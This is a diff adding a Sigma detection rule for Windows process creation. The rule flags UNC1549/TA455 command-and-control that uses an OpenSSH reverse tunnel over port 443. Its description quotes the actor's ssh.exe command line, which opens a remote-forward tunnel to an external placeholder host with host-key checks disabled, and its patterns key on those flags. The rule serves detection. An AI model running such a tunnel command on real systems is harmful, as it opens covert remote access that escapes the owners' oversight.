@@ -1,0 +1,35 @@
+title: UNC1549 OpenSSH Reverse Tunnel Over Port 443
+id: cc27fd6e-4526-41da-8902-3354edb20ab4
+status: experimental
+description: |
+    Detects UNC1549 / TA455 resilient, low-footprint C2 via a Windows OpenSSH reverse tunnel
+    (T1572 Protocol Tunneling). The actor launches ssh.exe with reverse-forward flags to an external
+    host on port 443 while disabling host-key verification, e.g.
+    "ssh.exe [User]@[IP] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no
+    -o UserKnownHostsFile=/dev/null -f -N -R 1070". Keys on ssh.exe process creation whose command line
+    combines the reverse-forward flag (-R) with StrictHostKeyChecking=no. Reverse tunnels initiated by
+    end-user endpoints to external IPs are highly anomalous.
+references:
+    - https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense
+author: mena-detection-library
+date: 2026-08-30
+tags:
+    - attack.command-and-control
+    - attack.t1572
+    - mena-detection-library.unc1549
+logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        Image|endswith: '\ssh.exe'
+        CommandLine|contains: '-R'
+    selection_flags:
+        CommandLine|contains:
+            - 'StrictHostKeyChecking=no'
+            - 'UserKnownHostsFile=/dev/null'
+    condition: all of selection*
+falsepositives:
+    - Developers or administrators legitimately using SSH remote-forward tunnels - verify the destination
+      IP, the port and whether the user has a business reason for a reverse tunnel
+level: high
